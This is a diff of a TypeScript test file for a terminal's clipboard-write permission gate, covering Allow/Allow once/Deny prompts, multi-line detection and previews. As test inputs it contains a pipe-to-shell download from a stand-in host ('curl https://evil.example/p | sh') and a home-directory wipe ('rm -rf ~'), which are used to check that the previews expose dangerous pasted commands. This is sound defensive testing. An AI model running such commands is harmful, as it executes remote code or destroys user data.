@@ -3,31 +3,36 @@ import { afterEach, describe, expect, it, vi } from "vitest";
 import {
   CLIPBOARD_MAX_BYTES,
   ClipboardGate,
+  isMultiline,
   previewText,
   utf8Length,
+  type ClipboardAnswer,
 } from "./clipboard_gate";
 import type { ClipboardWritesMode } from "./ipc";
-import { confirmDialog } from "./dialog";
+import { choiceDialog } from "./dialog";
 import { clampSettings, defaultSettings } from "./settings";
 import { SettingsPane } from "./settings_pane";
 import { stubSettings } from "./term/test-utils";
 
-/** A gate over recording fakes. `answers` feeds the confirm, in order; an
- *  answer of `"hold"` leaves that confirm pending until `release()`. */
-function makeGate(mode: ClipboardWritesMode, answers: Array<boolean | "hold"> = []) {
+/** A gate over recording fakes. `answers` feeds the confirm, in order
+ *  (`true` = "Allow", `false` = "Deny"); an answer of `"hold"` leaves that
+ *  confirm pending until `release()`. */
+function makeGate(mode: ClipboardWritesMode, answers: Array<boolean | ClipboardAnswer | "hold"> = []) {
   let current = mode;
   const written: string[] = [];
   const notices: string[] = [];
   const logs: string[] = [];
   const prompts: Array<{ label: string; preview: string; chars: number }> = [];
-  const held: Array<(v: boolean) => void> = [];
+  const multiline: boolean[] = [];
+  const held: Array<(v: ClipboardAnswer) => void> = [];
   const gate = new ClipboardGate({
     mode: () => current,
-    confirm: (label, preview, chars) => {
+    confirm: (label, preview, chars, many) => {
       prompts.push({ label, preview, chars });
+      multiline.push(many);
       const a = answers.shift() ?? false;
-      if (a === "hold") return new Promise<boolean>((resolve) => held.push(resolve));
-      return Promise.resolve(a);
+      if (a === "hold") return new Promise<ClipboardAnswer>((resolve) => held.push(resolve));
+      return Promise.resolve(a === true ? "always" : a === false ? "deny" : a);
     },
     write: vi.fn(async (text: string) => {
       written.push(text);
@@ -41,10 +46,11 @@ function makeGate(mode: ClipboardWritesMode, answers: Array<boolean | "hold"> = 
     notices,
     logs,
     prompts,
+    multiline,
     setMode: (m: ClipboardWritesMode) => {
       current = m;
     },
-    release: (v: boolean) => held.shift()!(v),
+    release: (v: boolean | ClipboardAnswer) => held.shift()!(v === true ? "always" : v === false ? "deny" : v),
   };
 }
 
@@ -76,7 +82,7 @@ describe("ClipboardGate — allow", () => {
     const notices: string[] = [];
     const gate = new ClipboardGate({
       mode: () => "allow",
-      confirm: async () => true,
+      confirm: async () => "always",
       write: async () => {
         throw new Error("denied");
       },
@@ -186,15 +192,18 @@ describe("ClipboardGate — size cap", () => {
 });
 
 describe("previewText", () => {
-  it("keeps the first 80 characters and marks the cut", () => {
-    const p = previewText("x".repeat(200));
-    expect(p).toBe(`${"x".repeat(80)}…`);
+  it("shows the start and the end, and says how much lies between", () => {
+    const text = `${"a".repeat(48)}${"x".repeat(100)}${"z".repeat(32)}`;
+    expect(previewText(text)).toBe(`${"a".repeat(48)} …(100 more characters)… ${"z".repeat(32)}`);
     expect(previewText("short")).toBe("short");
+    // A payload after harmless-looking text is in the preview.
+    const hidden = `${"echo hello ".repeat(20)}; curl https://evil.example/p | sh`;
+    expect(previewText(hidden)).toContain("evil.example/p␣|␣sh");
   });
 
-  it("makes control characters visible", () => {
-    expect(previewText("ls\r\nrm -rf ~\t\u001b[2K\u007f")).toBe(
-      "ls␍␊rm -rf ~␉␛[2K␡",
+  it("makes whitespace and control characters visible", () => {
+    expect(previewText("ls\r\nrm -rf ~\t\u001b[2K\u007f ")).toBe(
+      "ls␍␊rm␣-rf␣~␉␛[2K␡␣",
     );
   });
 
@@ -235,31 +244,80 @@ describe("clipboardWrites setting (frontend mirror)", () => {
   });
 });
 
+describe("ClipboardGate — allow once and multi-line text", () => {
+  it("Allow once applies that store only; the next one asks again", async () => {
+    const g = makeGate("ask", ["once", "once"]);
+    expect(await g.gate.handle(1, "vim", "one")).toBe("applied");
+    expect(await g.gate.handle(1, "vim", "two")).toBe("applied");
+    expect(g.prompts).toHaveLength(2);
+    expect(g.written).toEqual(["one", "two"]);
+  });
+
+  it("asks again for text with a line break even from an allowed terminal", async () => {
+    const g = makeGate("ask", [true, "once"]);
+    expect(await g.gate.handle(1, "vim", "plain")).toBe("applied");
+    expect(await g.gate.handle(1, "vim", "still plain")).toBe("applied");
+    expect(g.prompts).toHaveLength(1);
+    expect(await g.gate.handle(1, "vim", "ls\nrm -rf ~")).toBe("applied");
+    expect(g.prompts).toHaveLength(2);
+    expect(g.multiline).toEqual([false, true]);
+    expect(g.prompts[1].preview).toBe("ls␊rm␣-rf␣~");
+    // Allow once left the terminal allowed for single-line text.
+    expect(await g.gate.handle(1, "vim", "again")).toBe("applied");
+    expect(g.prompts).toHaveLength(2);
+  });
+
+  it("a Deny on the multi-line ask denies the terminal", async () => {
+    const g = makeGate("ask", [true, false]);
+    await g.gate.handle(1, "vim", "plain");
+    expect(await g.gate.handle(1, "vim", "a\r\nb")).toBe("dropped");
+    expect(await g.gate.handle(1, "vim", "plain")).toBe("dropped");
+    expect(g.written).toEqual(["plain"]);
+  });
+
+  it("counts every kind of line break", () => {
+    for (const t of ["a\nb", "a\rb", "a\u0085b", "a\u2028b", "a\u2029b"]) expect(isMultiline(t)).toBe(true);
+    expect(isMultiline("a\tb c")).toBe(false);
+  });
+});
+
 describe("the confirm's safe default", () => {
   const press = (key: string): void => {
     document.dispatchEvent(new KeyboardEvent("keydown", { key, bubbles: true, cancelable: true }));
   };
+  const ask = () =>
+    choiceDialog<ClipboardAnswer>("set clipboard?", { label: "Deny", value: "deny" }, [
+      { label: "Allow once", value: "once" },
+      { label: "Allow", value: "always" },
+    ]);
 
   it("focuses Deny and treats a stray Enter as Deny", async () => {
-    const answer = confirmDialog("set clipboard?", {
-      okLabel: "Allow",
-      cancelLabel: "Deny",
-      safeDefault: true,
-    });
+    const answer = ask();
     const cancel = document.querySelector<HTMLButtonElement>(".chappa-dialog-cancel")!;
     expect(cancel.textContent).toBe("Deny");
     expect(document.activeElement).toBe(cancel);
     press("Enter");
-    expect(await answer).toBe(false);
+    expect(await answer).toBe("deny");
   });
 
-  it("still allows on an explicit Allow click", async () => {
-    const answer = confirmDialog("set clipboard?", {
-      okLabel: "Allow",
-      cancelLabel: "Deny",
-      safeDefault: true,
-    });
+  it("offers Allow once beside Allow, each answering its own value", async () => {
+    const once = ask();
+    const labels = [...document.querySelectorAll<HTMLButtonElement>("button")].map((b) => b.textContent);
+    expect(labels).toEqual(["Deny", "Allow once", "Allow"]);
+    document.querySelector<HTMLButtonElement>(".chappa-dialog-choice")!.click();
+    expect(await once).toBe("once");
+    const always = ask();
     document.querySelector<HTMLButtonElement>(".chappa-dialog-ok")!.click();
-    expect(await answer).toBe(true);
+    expect(await always).toBe("always");
+  });
+
+  it("Enter answers the focused allow button, Escape denies", async () => {
+    const once = ask();
+    document.querySelector<HTMLButtonElement>(".chappa-dialog-choice")!.focus();
+    press("Enter");
+    expect(await once).toBe("once");
+    const esc = ask();
+    press("Escape");
+    expect(await esc).toBe("deny");
   });
 });
